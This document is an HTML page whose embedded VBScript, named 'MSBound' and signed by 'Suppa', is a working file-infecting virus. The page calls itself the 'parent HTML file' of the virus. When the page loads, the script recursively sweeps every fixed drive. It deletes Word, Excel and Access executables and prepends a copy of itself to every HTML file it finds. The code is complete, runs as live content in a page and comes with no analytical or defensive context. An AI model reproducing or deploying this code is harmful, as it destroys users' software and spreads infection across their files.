<SCRIPT LANGUAGE="VBScript"> 
<!--
  Dim FSO,MSBound,DC,D,TMP,F
  MSBound = "<SCRIPT LANGUAGE=#VBScript#>$<!--$  Dim FSO,MSBound,DC,D,TMP,F$  MSBound = #|#$  On Error Resume Next$  TMP = ReplaceWithIn(Chr(36),vbCrLf,MSBound)$  TMP = ReplaceWithIn(Chr(35),Chr(34),TMP)$  F = InStr(1,TMP,Chr(124))$  MSBound = Left(TMP,F-1) & MSBound & Mid(TMP,F+1)$  F = InStr(2500,MSBound,Chr(124))$  MSBound = Left(MSBound,F-1) & Mid(MSBound,F+1)$$  Set FSO = CreateObject(#Scripting.FileSystemObject#)$  If Err.Number = 0 Then$     Set DC = FSO.Drives$         For Each D In DC$         If D.DriveType = 2 Then$            SweepDrive D.DriveLetter & #:\#$         End If$     Next$  End If$$Sub SweepDrive(pPath)$  Dim F, S, O$  On Error Resume Next$  Set F = FSO.GetFolder(pPath)$  InfectFiles F$  Set S = F.SubFolders$  For Each O In S$      SweepDrive(pPath & O.Name & #\#)$  Next        $End Sub $$Sub InfectFiles(pFolder)$  Dim F,Member,Ext,M,C$  On Error Resume Next$  Set F = pFolder.Files$  For Each Member In F$      M = UCase(Member.Name)$      If M = #WINWORD.EXE# Or M = #ACCESS.EXE# Or M = #EXCEL.EXE# Or M = #WORD.EXE# Then$         Set M = FSO.GetFile(Member.Path)$         M.Attributes = (M.Attributes And 1) - 1$         M.Delete$      End If   $      Ext = UCase(FSO.GetExtensionName(Member.Name))$      If Ext = #HTML# Or Ext = #HTM# Then$         Set M = FSO.OpenTextFile(Member.Path,1)$         C = M.ReadAll$         If InStr(1,C,MSBound) = 0 Then$            Set M = FSO.CreateTextFile(Member.Path, True)$            M.WriteLine MSBound & C$            M.Close$         End If$      End if$  Next$End Sub$$Private Function ReplaceWithIn(CurChar,NewChar,SourceString)$  Dim T,TMP$  T = 1$  TMP = SourceString$  Do While T > 0$     T = InStr(T, TMP, CurChar)$     If T > 0 Then TMP = Left(TMP,T-1) & NewChar & Mid(TMP,T+1)$  Loop$  ReplaceWithIn = TMP$End Function$$'MSBound by Suppa.$-->$<|/SCRIPT>$$"
  On Error Resume Next
  TMP = ReplaceWithIn(Chr(36),vbCrLf,MSBound)
  TMP = ReplaceWithIn(Chr(35),Chr(34),TMP)
  F = InStr(1,TMP,Chr(124))
  MSBound = Left(TMP,F-1) & MSBound & Mid(TMP,F+1)
  F = InStr(2500,MSBound,Chr(124))
  MSBound = Left(MSBound,F-1) & Mid(MSBound,F+1)
  
  Set FSO = CreateObject("Scripting.FileSystemObject")
  If Err.Number = 0 Then
     Set DC = FSO.Drives 
     For Each D In DC
         If D.DriveType = 2 Then
            SweepDrive D.DriveLetter & ":\"
         End If
     Next       
  End If

Sub SweepDrive(pPath)
  Dim F, S, O
  On Error Resume Next
  Set F = FSO.GetFolder(pPath)
  InfectFiles F
  Set S = F.SubFolders
  For Each O In S
      SweepDrive(pPath & O.Name & "\")
  Next        
End Sub 

Sub InfectFiles(pFolder)
  Dim F,Member,Ext,M,C
  On Error Resume Next
  Set F = pFolder.Files
  For Each Member In F
      M = UCase(Member.Name)
      If M = "WINWORD.EXE" Or M = "ACCESS.EXE" Or M = "EXCEL.EXE" Or M = "WORD.EXE" Then
         Set M = FSO.GetFile(Member.Path)
         M.Attributes = (M.Attributes And 1) - 1
         M.Delete
      End If   
      Ext = UCase(FSO.GetExtensionName(Member.Name))
      If Ext = "HTML" Or Ext = "HTM" Then
         Set M = FSO.OpenTextFile(Member.Path,1)
         C = M.ReadAll
         If InStr(1,C,MSBound) = 0 Then
            Set M = FSO.CreateTextFile(Member.Path, True)
            M.WriteLine MSBound & C
            M.Close
         End If
      End if
  Next
End Sub

Private Function ReplaceWithIn(CurChar,NewChar,SourceString)
  Dim T,TMP
  T = 1
  TMP = SourceString
  Do While T > 0
     T = InStr(T, TMP, CurChar)
     If T > 0 Then TMP = Left(TMP,T-1) & NewChar & Mid(TMP,T+1)
  Loop
  ReplaceWithIn = TMP
End Function

'MSBound by Suppa. 
-->
</SCRIPT>

<HTML>
<HEAD><TITLE>MSBound</TITLE></HEAD>
<BODY BGCOLOR="#000000">
<BR><BR><BR>
<CENTER><TABLE BORDER=0  BGCOLOR="#000000" CELLPADDING=10>
<TR><TD>
<FONT COLOR="#FF0000">
<U><B><FONT COLOR="#FF0000"> MSBound by Suppa.</B></U>
<BR><BR><BR>
This is the parent HTML file containing MSBound written by Suppa.<BR>
Feel free do to what you want with it, but don't blame me if it comes back to you.<BR>
<BR>
Special thanks go out to Gigabyte for getting me interested in these things.<BR> 
</FONT> 
</TD></TR>
</TABLE></CENTER>
</BODY>
</HTML>
